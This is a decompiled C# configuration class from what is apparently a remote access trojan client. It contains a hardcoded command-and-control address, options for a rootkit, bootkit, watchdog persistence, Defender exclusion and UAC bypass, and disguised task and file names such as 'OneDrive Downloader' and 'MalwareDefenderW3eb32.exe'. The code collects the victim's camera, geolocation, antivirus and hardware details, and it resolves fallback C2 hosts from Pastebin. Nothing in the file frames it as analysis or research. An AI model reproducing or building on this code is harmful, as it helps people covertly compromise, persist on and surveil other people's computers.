using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using Client.Helper;

namespace Client;

internal class Config
{
	public static string Hosts = "195.10.205.179:25565";

	public static string Group = "Superiority";

	public static string Version = "1.0";

	public static string Mutex = "yp07tia%jr+2";

	public static string Install = "true";

	public static string BootKit = "true";

	public static string Rootkit = "true";

	public static string InstallWatchDog = "true";

	public static string UseInstallAdmin = "true";

	public static string ExclusionWD = "true";

	public static string HiddenFile = "false";

	public static string SafeMode = "false";

	public static string Pump = "false";

	public static string PumpSizeBytes = "";

	public static string TaskClient = "Windows Perfoment Host";

	public static string TaskWatchDog = "OneDrive Downloader";

	public static string PathClient = "%LocalApplicationData%\\MalwareDefenderW3eb32.exe";

	public static string PathWatchDog = "%Windows%\\BootExecutor.exe";

	public static string Certificate = "hz24pph0a";

	public static string AntiVM = "false";

	public static string AntiVPS = "false";

	public static string UserInit = "true";

	public static string CmdlineAutorun = "true";

	public static string CmdlinePath = "cmd /c start /b \"\" \"C:\\Users\\frasty\\AppData\\Local\\Boot.exe\"";

	public static string ProcessCritical = "false";

	public static string DriverInfection = "false";

	public static string UACBypass = "false";

	public static string Debugger = "false";

	public static string DebuggerList = "";

	public static string Key = "cky9r4ytydhcwji3z3dizpj";

	public static string Camera;

	public static string GeoInfo;

	public static string LocalIP;

	public static string Cpu;

	public static string Gpu;

	public static string AntiVirus;

	public static string RegKey;

	public static string WindowsVersion;

	public static string Hwid;

	public static string DataInstall;

	public static string Privilege;

	public static X509Certificate2 ServerCertificate;

	public static string PastebinUrl = null;

	public static void Init()
	{
		AntiVM = EncryptString.Decode(AntiVM);
		if (string.IsNullOrEmpty(AntiVM) || AntiVM.Contains("%"))
		{
			AntiVM = "false";
		}
		string antiVPS;
		try
		{
			antiVPS = EncryptString.Decode(AntiVPS);
		}
		catch
		{
			antiVPS = AntiVPS;
		}
		AntiVPS = antiVPS;
		if (string.IsNullOrEmpty(AntiVPS) || AntiVPS.Contains("%"))
		{
			AntiVPS = "false";
		}
		string environmentVariable = Environment.GetEnvironmentVariable("DISABLE_ANTIVIRTUAL");
		if (!string.IsNullOrEmpty(environmentVariable) && (environmentVariable == "1" || environmentVariable.Equals("true", StringComparison.OrdinalIgnoreCase)))
		{
			AntiVM = "false";
			AntiVPS = "false";
		}
		if (string.Equals(AntiVM, "true", StringComparison.OrdinalIgnoreCase) || string.Equals(AntiVPS, "true", StringComparison.OrdinalIgnoreCase))
		{
			AntiVirtual.RunAntiAnalysis();
		}
		RegKey = EncryptString.Decode("Software\\gogoduck");
		try
		{
			WindowsVersion = Methods.GetWindowsVersion();
		}
		catch
		{
			WindowsVersion = string.Empty;
		}
		try
		{
			Gpu = string.Join(EncryptString.Decode(","), Methods.GetHardwareInfo(EncryptString.Decode("Win32_VideoController"), EncryptString.Decode("Name")));
		}
		catch
		{
			Gpu = string.Empty;
		}
		try
		{
			DataInstall = File.GetCreationTime(Process.GetCurrentProcess().MainModule.FileName).ToString(EncryptString.Decode("dd.MM.yyyy"));
		}
		catch
		{
			DataInstall = string.Empty;
		}
		try
		{
			Hwid = HwidGenerator.hwid();
		}
		catch
		{
			Hwid = string.Empty;
		}
		try
		{
			Cpu = string.Join(EncryptString.Decode(","), Methods.GetHardwareInfo(EncryptString.Decode("Win32_Processor"), EncryptString.Decode("Name")));
		}
		catch
		{
			Cpu = string.Empty;
		}
		try
		{
			AntiVirus = Methods.Antivirus();
		}
		catch
		{
			AntiVirus = string.Empty;
		}
		try
		{
			Camera = Methods.Camera();
		}
		catch
		{
			Camera = string.Empty;
		}
		try
		{
			GeoInfo = Methods.GetGeoInfo();
		}
		catch
		{
			GeoInfo = "N/A";
		}
		try
		{
			LocalIP = Methods.GetLocalIP();
		}
		catch
		{
			LocalIP = "N/A";
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Privilege = "Admin";
		}
		else
		{
			Privilege = "User";
		}
		Hosts = EncryptString.Decode(Hosts);
		if (Hosts.StartsWith("PASTEBIN:"))
		{
			string pastebinUrl = (PastebinUrl = Hosts.Substring(9));
			try
			{
				string text = LoadConfigFromPastebin(pastebinUrl);
				if (!string.IsNullOrWhiteSpace(text))
				{
					Hosts = text;
				}
				else
				{
					Hosts = string.Empty;
				}
			}
			catch
			{
				Hosts = string.Empty;
			}
		}
		else
		{
			PastebinUrl = null;
		}
		Group = EncryptString.Decode(Group);
		Version = EncryptString.Decode(Version);
		Mutex = EncryptString.Decode(Mutex);
		if (string.IsNullOrEmpty(Mutex) || Mutex.Contains("%"))
		{
			Mutex = "GogoDuck_Mutex_" + Hwid;
		}
		Install = EncryptString.Decode(Install);
		if (string.IsNullOrEmpty(Install) || Install.Contains("%"))
		{
			Install = "false";
		}
		PathClient = EncryptString.Decode(PathClient);
		TaskClient = EncryptString.Decode(TaskClient);
		UseInstallAdmin = EncryptString.Decode(UseInstallAdmin);
		if (string.IsNullOrEmpty(UseInstallAdmin) || UseInstallAdmin.Contains("%"))
		{
			UseInstallAdmin = "false";
		}
		UserInit = EncryptString.Decode(UserInit);
		if (string.IsNullOrEmpty(UserInit) || UserInit.Contains("%"))
		{
			UserInit = "false";
		}
		InstallWatchDog = EncryptString.Decode(InstallWatchDog);
		if (string.IsNullOrEmpty(InstallWatchDog) || InstallWatchDog.Contains("%"))
		{
			InstallWatchDog = "false";
		}
		PathWatchDog = EncryptString.Decode(PathWatchDog);
		TaskWatchDog = EncryptString.Decode(TaskWatchDog);
		BootKit = EncryptString.Decode(BootKit);
		if (string.IsNullOrEmpty(BootKit) || BootKit.Contains("%"))
		{
			BootKit = "false";
		}
		Rootkit = EncryptString.Decode(Rootkit);
		if (string.IsNullOrEmpty(Rootkit) || Rootkit.Contains("%"))
		{
			Rootkit = "false";
		}
		SafeMode = EncryptString.Decode(SafeMode);
		if (string.IsNullOrEmpty(SafeMode) || SafeMode.Contains("%"))
		{
			SafeMode = "false";
		}
		string environmentVariable2 = Environment.GetEnvironmentVariable("DISABLE_PATCHING");
		if (!string.IsNullOrEmpty(environmentVariable2) && (environmentVariable2 == "1" || environmentVariable2.Equals("true", StringComparison.OrdinalIgnoreCase)))
		{
			SafeMode = "true";
		}
		Key = EncryptString.Decode(Key);
		Certificate = EncryptString.Decode(Certificate);
		CmdlineAutorun = EncryptString.Decode(CmdlineAutorun);
		if (string.IsNullOrEmpty(CmdlineAutorun) || CmdlineAutorun.Contains("%"))
		{
			CmdlineAutorun = "false";
		}
		CmdlinePath = Methods.GetPath(EncryptString.Decode(CmdlinePath));
		ProcessCritical = EncryptString.Decode(ProcessCritical);
		if (string.IsNullOrEmpty(ProcessCritical) || ProcessCritical.Contains("%"))
		{
			ProcessCritical = "false";
		}
		ExclusionWD = EncryptString.Decode(ExclusionWD);
		if (string.IsNullOrEmpty(ExclusionWD) || ExclusionWD.Contains("%"))
		{
			ExclusionWD = "false";
		}
		HiddenFile = EncryptString.Decode(HiddenFile);
		if (string.IsNullOrEmpty(HiddenFile) || HiddenFile.Contains("%"))
		{
			HiddenFile = "false";
		}
		Pump = EncryptString.Decode(Pump);
		if (string.IsNullOrEmpty(Pump) || Pump.Contains("%"))
		{
			Pump = "false";
		}
		PumpSizeBytes = EncryptString.Decode(PumpSizeBytes);
		DriverInfection = EncryptString.Decode(DriverInfection);
		if (string.IsNullOrEmpty(DriverInfection) || DriverInfection.Contains("%"))
		{
			DriverInfection = "false";
		}
		UACBypass = EncryptString.Decode(UACBypass);
		if (string.IsNullOrEmpty(UACBypass) || UACBypass.Contains("%"))
		{
			UACBypass = "false";
		}
		Debugger = EncryptString.Decode(Debugger);
		if (string.IsNullOrEmpty(Debugger) || Debugger.Contains("%"))
		{
			Debugger = "false";
		}
		DebuggerList = EncryptString.Decode(DebuggerList);
		if (string.IsNullOrEmpty(DebuggerList) || DebuggerList.Contains("%"))
		{
			DebuggerList = "";
		}
		if (string.IsNullOrEmpty(Install) || (Install.StartsWith("%") && Install.EndsWith("%")))
		{
			Install = "false";
		}
		if (string.IsNullOrEmpty(TaskClient) || (TaskClient.StartsWith("%") && TaskClient.EndsWith("%")))
		{
			TaskClient = "WindowsControl";
		}
		if (string.IsNullOrEmpty(PathClient) || (PathClient.StartsWith("%") && PathClient.EndsWith("%")))
		{
			PathClient = Path.GetFullPath(Methods.GetPath("%ApplicationData%\\WindowsControl\\WindowsControl.exe"));
		}
		else
		{
			try
			{
				string path = Methods.GetPath(PathClient);
				if (path.IndexOfAny(Path.GetInvalidPathChars()) == -1)
				{
					PathClient = Path.GetFullPath(path);
				}
				else
				{
					PathClient = Path.GetFullPath(Methods.GetPath("%ApplicationData%\\WindowsControl\\WindowsControl.exe"));
				}
			}
			catch
			{
				PathClient = Path.GetFullPath(Methods.GetPath("%ApplicationData%\\WindowsControl\\WindowsControl.exe"));
			}
		}
		if (string.IsNullOrEmpty(CmdlineAutorun) || (CmdlineAutorun.StartsWith("%") && CmdlineAutorun.EndsWith("%")))
		{
			CmdlineAutorun = "false";
		}
		if (string.IsNullOrEmpty(UseInstallAdmin) || (UseInstallAdmin.StartsWith("%") && UseInstallAdmin.EndsWith("%")))
		{
			UseInstallAdmin = "false";
		}
		if (string.IsNullOrEmpty(UserInit) || (UserInit.StartsWith("%") && UserInit.EndsWith("%")))
		{
			UserInit = "false";
		}
		if (string.IsNullOrEmpty(InstallWatchDog) || (InstallWatchDog.StartsWith("%") && InstallWatchDog.EndsWith("%")))
		{
			InstallWatchDog = "false";
		}
		if (string.IsNullOrEmpty(PathWatchDog) || (PathWatchDog.StartsWith("%") && PathWatchDog.EndsWith("%")))
		{
			PathWatchDog = Path.GetFullPath(Methods.GetPath("%ApplicationData%\\WindowsControl\\WindowsControlW.exe"));
		}
		else
		{
			try
			{
				string path2 = Methods.GetPath(PathWatchDog);
				if (path2.IndexOfAny(Path.GetInvalidPathChars()) == -1)
				{
					PathWatchDog = Path.GetFullPath(path2);
				}
				else
				{
					PathWatchDog = Path.GetFullPath(Methods.GetPath("%ApplicationData%\\WindowsControl\\WindowsControlW.exe"));
				}
			}
			catch
			{
				PathWatchDog = Path.GetFullPath(Methods.GetPath("%ApplicationData%\\WindowsControl\\WindowsControlW.exe"));
			}
		}
		if (string.IsNullOrEmpty(TaskWatchDog) || (TaskWatchDog.StartsWith("%") && TaskWatchDog.EndsWith("%")))
		{
			TaskWatchDog = "WindowsControlW";
		}
		try
		{
			ServerCertificate = new X509Certificate2(Xor.DecodEncod(Methods.GetResourceFile(Certificate), Encoding.ASCII.GetBytes(Key)));
		}
		catch
		{
			ServerCertificate = null;
		}
	}

	public static string LoadConfigFromPastebin(string pastebinUrl)
	{
		string text = pastebinUrl;
		if (!text.Contains("/raw/"))
		{
			if (!text.Contains("pastebin.com/"))
			{
				throw new Exception("Invalid Pastebin URL");
			}
			string text2 = text.Substring(text.LastIndexOf("/") + 1);
			if (text2.Contains("?"))
			{
				text2 = text2.Substring(0, text2.IndexOf("?"));
			}
			text = "https://pastebin.com/raw/" + text2;
		}
		using WebClient webClient = new WebClient();
		webClient.Headers.Add("User-Agent", "Mozilla/5.0");
		string text3 = webClient.DownloadString(text);
		if (string.IsNullOrWhiteSpace(text3))
		{
			throw new Exception("Pastebin content is empty");
		}
		string text4 = ExtractHostsFromJson(text3);
		if (!string.IsNullOrEmpty(text4))
		{
			return text4;
		}
		if (!text3.Trim().StartsWith("{"))
		{
			string text5 = text3.Trim().Replace("\r\n", ";").Replace("\n", ";")
				.Replace("\r", ";");
			if (!string.IsNullOrWhiteSpace(text5))
			{
				return text5;
			}
		}
		throw new Exception("Invalid configuration format - Hosts not found in Pastebin");
	}

	private static string ExtractHostsFromJson(string jsonData)
	{
		try
		{
			Match match = Regex.Match(jsonData, "\"Hosts\"\\s*:\\s*\\[(.*?)\\]", RegexOptions.IgnoreCase);
			if (match.Success)
			{
				string value = match.Groups[1].Value;
				List<string> list = new List<string>();
				foreach (Match item in Regex.Matches(value, "\"([^\"]+)\""))
				{
					list.Add(item.Groups[1].Value);
				}
				if (list.Count > 0)
				{
					return string.Join(";", list);
				}
			}
			Match match3 = Regex.Match(jsonData, "\"Hosts\"\\s*:\\s*\"([^\"]+)\"", RegexOptions.IgnoreCase);
			if (match3.Success)
			{
				return match3.Groups[1].Value;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	public static bool TryLoadFromPastebin()
	{
		if (string.IsNullOrWhiteSpace(PastebinUrl))
		{
			return false;
		}
		try
		{
			string text = LoadConfigFromPastebin(PastebinUrl);
			if (!string.IsNullOrWhiteSpace(text))
			{
				Hosts = text;
				return true;
			}
		}
		catch
		{
		}
		return false;
	}
}
